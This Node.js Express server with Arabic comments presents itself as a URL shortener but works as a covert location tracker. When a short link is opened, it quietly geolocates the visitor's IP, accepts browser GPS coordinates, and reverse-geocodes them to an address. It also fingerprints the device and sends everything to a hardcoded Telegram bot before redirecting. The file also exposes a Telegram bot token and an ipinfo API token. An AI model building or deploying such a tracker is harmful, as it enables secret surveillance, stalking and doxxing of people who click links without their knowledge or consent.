const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      console.log('✅ [TG] Sent:', response.data.result.message_id);
      return true;
    } catch (err) {
      console.error(`❌ [TG] Attempt ${i + 1} failed:`, err.response?.data?.description || err.message);
      if (i < retries - 1) await new Promise(r => setTimeout(r, 800));
    }
  }
  return false;
}

// ===== طرق تحديد الموقع بدقة عالية =====

// Method 1: GeoJS (دقيق وسريع)
async function getLocationFromGeoJS(ip) {
  try {
    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 3000 });
    if (res.data) {
      return {
        source: 'GeoJS',
        country: res.data.country_name || 'Unknown',
        city: res.data.city || 'Unknown',
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        accuracy: '±15-50km',
        isp: res.data.organization || 'Unknown'
      };
    }
  } catch (e) {
    console.log('[GeoJS] Error:', e.message);
  }
  return null;
}

// Method 2: ipinfo.io (دقيق جداً)
async function getLocationFromIPInfo(ip) {
  try {
    const res = await axios.get(`https://ipinfo.io/${ip}?token=9f5b1ad4e5e8e0`, { timeout: 3000 });
    if (res.data && res.data.loc) {
      const [lat, lng] = res.data.loc.split(',');
      return {
        source: 'IPInfo',
        country: res.data.country || 'Unknown',
        city: res.data.city || 'Unknown',
        latitude: parseFloat(lat),
        longitude: parseFloat(lng),
        accuracy: '±10-30km',
        isp: res.data.org || 'Unknown',
        timezone: res.data.timezone || 'Unknown'
      };
    }
  } catch (e) {
    console.log('[IPInfo] Error:', e.message);
  }
  return null;
}

// Method 3: ip-api.com (fallback)
async function getLocationFromIPAPI(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
    if (res.data && res.data.status === 'success') {
      return {
        source: 'IP-API',
        country: res.data.country,
        city: res.data.city,
        latitude: parseFloat(res.data.lat),
        longitude: parseFloat(res.data.lon),
        accuracy: '±50-100km',
        isp: res.data.isp
      };
    }
  } catch (e) {
    console.log('[IP-API] Error:', e.message);
  }
  return null;
}

// جرّب كل الطرق وخذ الأفضل
async function getBestLocation(ip) {
  const geojs = await getLocationFromGeoJS(ip);
  if (geojs) return geojs;

  const ipinfo = await getLocationFromIPInfo(ip);
  if (ipinfo) return ipinfo;

  const ipapi = await getLocationFromIPAPI(ip);
  if (ipapi) return ipapi;

  return null;
}

// Reverse Geocoding (تحويل الإحداثيات لعنوان)
async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 3000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.address) {
      const addr = res.data.address;
      return {
        country: addr.country || 'Unknown',
        city: addr.city || addr.town || addr.village || 'Unknown',
        address: res.data.display_name || 'N/A'
      };
    }
  } catch (e) {
    console.log('[Reverse] Error:', e.message);
  }
  return null;
}

function parseUserAgent(ua) {
  let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
  if (/android/i.test(ua)) { device = 'Android'; os = 'Android'; }
  else if (/iphone|ipad/i.test(ua)) { device = 'iOS'; os = 'iOS'; }
  else if (/windows/i.test(ua)) os = 'Windows';
  else if (/mac os/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';
  if (/chrome/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
  else if (/firefox/i.test(ua)) browser = 'Firefox';
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
  else if (/edg/i.test(ua)) browser = 'Edge';
  return { device, os, browser };
}

function safeParseBody(req) {
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return req.body || {};
}

// ===== API ROUTES =====

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  console.log(`[SHORT] Created: ${shortCode} -> ${normalizedUrl}`);

  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-all', async (req, res) => {
  const body = safeParseBody(req);
  const { code, gps } = body;

  if (!code || !linkStorage[code]) {
    console.log('[API] Code not found:', code);
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
  const userAgent = req.get('user-agent') || 'Unknown';
  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  console.log(`[LOG] Processing ${code} | IP: ${ip}`);

  let gpsInfo = null;
  if (gps && gps.latitude && gps.longitude) {
    gpsInfo = {
      latitude: parseFloat(gps.latitude).toFixed(6),
      longitude: parseFloat(gps.longitude).toFixed(6),
      accuracy: `±${(gps.accuracy || 20).toFixed(0)}m`,
      altitude: gps.altitude ? `${Math.round(gps.altitude)}m` : 'N/A',
      heading: (gps.heading !== null && gps.heading !== undefined) ? `${Math.round(gps.heading)}°` : 'N/A'
    };
  }

  const ipInfo = await getBestLocation(ip);
  let reverseInfo = null;

  if (gpsInfo) {
    reverseInfo = await reverseGeocode(gpsInfo.latitude, gpsInfo.longitude);
  } else if (ipInfo) {
    reverseInfo = await reverseGeocode(ipInfo.latitude, ipInfo.longitude);
  }

  const device = parseUserAgent(userAgent);

  let msg = `🔗 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
  msg += `<b>🌐 الرابط:</b> ${originalUrl}\n`;
  msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  if (gpsInfo) {
    msg += `<b>✅ [1] 📍 Browser GPS (الأدق)</b>\n📍 <code>${gpsInfo.latitude}, ${gpsInfo.longitude}</code>\n📏 ${gpsInfo.accuracy}\n⛰️ ${gpsInfo.altitude}\n🧭 ${gpsInfo.heading}\n🗺️ <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [1] Browser GPS</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (ipInfo) {
    msg += `<b>✅ [2] 🌐 IP Location (${ipInfo.source})</b>\n🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n📏 ${ipInfo.accuracy}\n🏢 ${ipInfo.isp}\n🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>❌ [2] IP Location</b> - فشل جميع الطرق\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  if (reverseInfo) {
    msg += `<b>✅ [3] 🗺️ Reverse Geocoding</b>\n🏳️ ${reverseInfo.country}\n🏙️ ${reverseInfo.city}\n🏘️ ${reverseInfo.address}\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  msg += `<b>✅ [4] 🖥️ Device Detection</b>\n📱 ${device.device} | ${device.os} | ${device.browser}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  const bestMethod = gpsInfo ? '📍 GPS' : (ipInfo ? `🌐 ${ipInfo.source}` : 'N/A');
  msg += `<b>🎯 أفضل موقع:</b> ${bestMethod}`;

  await sendToTelegram(msg);
  res.json({ success: true });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 رسالة اختبار ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

app.get('/api/stats/:code', (req, res) => {
  const link = linkStorage[req.params.code];
  if (!link) return res.status(404).json({ error: 'Not found' });
  res.json(link);
});

app.use(express.static('.'));

// ===== REDIRECT فوري (بدون صفحة وسيطة) =====
app.get('/:code', async (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1 style="font-family:sans-serif;text-align:center;margin-top:50px">الرابط غير موجود</h1>');
  }

  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  // Log في background (بدون تأخير)
  setImmediate(async () => {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
    const userAgent = req.get('user-agent') || 'Unknown';
    const ipInfo = await getBestLocation(ip);
    const device = parseUserAgent(userAgent);

    let msg = `🔗 <b>رابط تم فتحه!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>📌 الكود:</b> <code>${code}</code>\n`;
    msg += `<b>🌐 الرابط:</b> ${originalUrl}\n`;
    msg += `<b>🔌 IP:</b> <code>${ip}</code>\n`;
    msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n`;

    if (ipInfo) {
      msg += `━━━━━━━━━━━━━━━━━━━\n`;
      msg += `<b>✅ 📍 IP Location (${ipInfo.source})</b>\n`;
      msg += `🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city}\n`;
      msg += `📍 <code>${ipInfo.latitude}, ${ipInfo.longitude}</code>\n`;
      msg += `📏 ${ipInfo.accuracy}\n`;
      msg += `🗺️ <a href="https://maps.google.com/?q=${ipInfo.latitude},${ipInfo.longitude}">Maps</a>\n`;
    }

    msg += `🖥️ ${device.device} | ${device.os} | ${device.browser}`;
    await sendToTelegram(msg);
  });

  // Redirect فوري (HTTP 301)
  res.redirect(301, originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});